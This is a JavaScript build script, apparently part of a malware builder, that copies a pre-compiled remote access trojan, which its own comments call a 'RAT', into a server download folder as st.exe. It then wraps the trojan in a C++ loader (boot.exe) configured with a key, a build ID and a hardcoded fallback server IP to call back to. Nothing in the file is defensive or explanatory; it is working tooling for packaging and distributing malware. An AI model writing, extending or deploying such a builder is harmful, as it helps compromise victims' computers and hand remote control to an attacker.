// language: JavaScript, file: builder/rustbuild.js
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { compileLauncher } from './compile.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT_DIR = path.join(__dirname, '..');
const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');
const BASE_EXE = path.join(ROOT_DIR, 'base', 'base.exe');

export async function buildBoot({ key, buildId }) {
  if (!fs.existsSync(BASE_EXE)) {
    throw new Error(`Base executable missing at ${BASE_EXE}. Compile locally and upload it.`);
  }

  if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
  
  // Copy the pre-compiled RAT to the server's download folder
  fs.copyFileSync(BASE_EXE, path.join(DOWNLOAD_DIR, 'st.exe'));

  console.log('[build] wrapping into boot.exe...');
  
  // Wrap the tiny C++ loader around it
  const bootBuf = await compileLauncher({ 
    key, 
    buildId,
    config: { ip: process.env.SERVER_IP || '95.182.96.216' }, 
    baseExe: BASE_EXE 
  });
  
  return bootBuf;
}